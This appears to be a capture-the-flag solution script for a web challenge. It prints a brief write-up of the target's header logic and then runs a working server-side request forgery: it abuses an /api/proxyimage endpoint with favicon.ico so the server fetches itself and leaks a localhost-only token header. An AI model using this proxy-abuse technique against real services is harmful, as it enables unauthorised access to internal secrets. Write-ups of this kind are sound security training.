#!/usr/bin/env python3
import requests
from _env import HOST

print(
    """
[WEB] medium
For this one, we need to be able to craft a request as localhost.
Then, the server will add the X-Localhost-Token header:
        
    @app.after_request
    def secure(response: Response):
        if not request.path[-3:] in ["jpg", "png", "gif"]:
            response.headers["X-Frame-Options"] = "SAMEORIGIN"
            response.headers["X-Xss-Protection"] = "1; mode=block"
            response.headers["X-Content-Type-Options"] = "nosniff"
            response.headers["Content-Security-Policy"] = "script-src 'self' 'unsafe-inline';"
            response.headers["Referrer-Policy"] = "no-referrer-when-downgrade"
            response.headers["Feature-Policy"] = "geolocation 'self'; midi 'self'; sync-xhr 'self'; microphone 'self'; "  \\
                                                 "camera 'self'; magnetometer 'self'; gyroscope 'self'; speaker 'self'; " \\
                                                 "fullscreen *; payment 'self'; "
            if request.remote_addr == "127.0.0.1":
                response.headers["X-Localhost-Token"] = TOKEN

        return response
        
    
A simple way is to mis-use the /api/proxyimage function.
The function forwards images including all headers.
We need a valid image that is already hosted in a local directory.
Since the `secure` will not add Headers for pngs, we need to find a non-png image.
(SVGs don't work btw, since they are XMLs.)
An accessible valid image is the favicon. :)

The single line of python to get the request is:

    resp = requests.get("http://{}/api/proxyimage?url=favicon.ico".format(host))
    
The Flag is: 
    """
)

resp = requests.get("http://{}/api/proxyimage?url=favicon.ico".format(HOST))
print(resp.headers["X-Localhost-Token"])